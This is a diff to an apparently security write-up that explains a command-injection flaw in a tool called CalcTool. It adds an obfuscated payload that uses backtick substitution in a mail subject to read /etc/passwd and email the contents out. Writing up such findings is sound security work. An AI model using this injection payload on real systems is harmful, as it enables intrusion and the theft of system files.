@@ -165,8 +165,15 @@ LOGFILE /tmp/synack77
 
 ![Final Payload](/assets/param-rce-final-payload.png)
 
-The results of the email:
+Here is how the payload looks when it is ran by CalcTool:
+```plaintext
+mail -s "CalcTool Output: `a=ca;b=t;$a$b /e*c/pa*s*d > /tmp/synack77`" email@gmail.com < /tmp/synack77
+```
 
+The command within the back ticks is executed before the mail command is run. Therefore, the output of our command will be stored in /tmp/synack77 before the mail command runs and we get an email with the results of our command. In this case we are reading /etc/passwd. 
+
+Finally, I received an email results of the cat /etc/passwd command:
 ![Payload Contents](/assets/param-rce-email-output-passwd.jpg)
+
 
 Thanks for reading!
